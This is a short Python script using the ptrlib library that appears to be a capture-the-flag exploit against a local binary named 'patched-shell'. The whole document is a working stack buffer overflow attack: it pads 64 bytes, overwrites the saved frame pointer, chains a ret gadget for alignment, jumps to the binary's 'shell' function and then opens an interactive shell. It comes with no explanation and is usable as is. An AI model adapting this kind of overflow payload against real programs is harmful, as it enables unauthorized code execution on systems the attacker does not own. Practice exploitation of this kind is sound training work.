from ptrlib import *

file = "./patched-shell"
e = ELF(file)
sock = Process(file)
sock.debug = True

rop_ret = 0x0040101a

payload = b"A"*64 + p64(0) + p64(rop_ret) + p64(e.symbol("shell"))
sock.sendline(payload)

sock.sh()
